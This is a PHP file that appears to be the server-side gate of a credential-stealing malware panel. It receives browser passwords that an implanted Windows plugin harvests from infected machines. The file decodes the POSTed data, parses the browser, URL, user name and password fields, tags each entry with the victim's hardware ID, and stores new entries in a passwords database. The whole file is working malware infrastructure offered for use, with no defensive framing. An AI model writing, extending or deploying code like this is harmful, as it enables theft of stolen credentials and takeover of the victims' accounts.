<?php
/*
This script is used to receive data from the plugin client! It will be included the gate.php. 
The data that plugin is sending is in the $_POST[] variable. You can use your own methods foreach
communicating with clients but its important to respect user preferances about http/https.
*/
if(!isset($initialized))
{
	include('../../pages/404.php');
}
// HWID is automatically passed as $_POST['hwid'];
if(isset($_POST['data']))
{
	$password_list = explode("==================================================",trim(mb_convert_encoding(base64_decode($_POST['data']), "UTF-8", "UTF-16LE")," \t\n\r\0\x0B"));//Keep in mind that wchar_t on windows is UTF-16LE
	
	$hwid = "N/A";
	
	if(isset($_POST['hwid'])) // HWID will always be set. You can however override it if you set it your self in the .dll when sending a post req
	{
		$hwid = $_POST['hwid']; 
	}
	
	foreach($password_list as $item)
	{
		$browser = "";
		$website = "";
		$username = "";
		$password = "";
		
		$password_array = explode(PHP_EOL, $item);
		foreach($password_array as $password_data)
		{
			if(strpos($password_data,'Web Browser       :') !== false) 
			{
				$browser = str_replace('Web Browser       :','',$password_data);
			}
			elseif(strpos($password_data,'URL               :') !== false)
			{
				$website = str_replace('URL               :','',$password_data);
			}
			elseif(strpos($password_data,'User Name         :') !== false)
			{
				$username = str_replace('User Name         :','',$password_data);
			}
			elseif(strpos($password_data,'Password          :') !== false)
			{
				$password = str_replace('Password          :','',$password_data);
			}
		}
		if($browser != "")
		{
			// Insert query
			$query = "SELECT * FROM passwords WHERE browser = :browser AND website = :website AND username = :username AND password = :password AND hwid = :hwid"; 
			$query_params = array(':browser' => $browser, ':website' => $website, ':username' => $username, ':password' => $password, ':hwid' => $hwid); 
			
			try 
			{ 
				// Execute the query against the database 
				$stmt = $db->prepare($query); 
				$result = $stmt->execute($query_params); 
			} 
			catch(PDOException $ex) 
			{ 
				DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
			} 
			$row = $stmt->fetch();

			// If not found insert it
			if(!$row) 
			{
				$query = "INSERT INTO passwords (browser, website, username, password, hwid) VALUES (:browser, :website, :username, :password, :hwid)";
				$query_params = array(':browser' => $browser, ':website' => $website, ':username' => $username, ':password' => $password, ':hwid' => $hwid); 
			}
			try 
			{ 
				// Execute the query against the database 
				$stmt = $db->prepare($query); 
				$stmt->execute($query_params); 
			} 
			catch(PDOException $ex) 
			{ 
				DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
			} 
		}	
	}
	
	SendResponse("Passwords stored with success!"); // Not really needed!
}
?>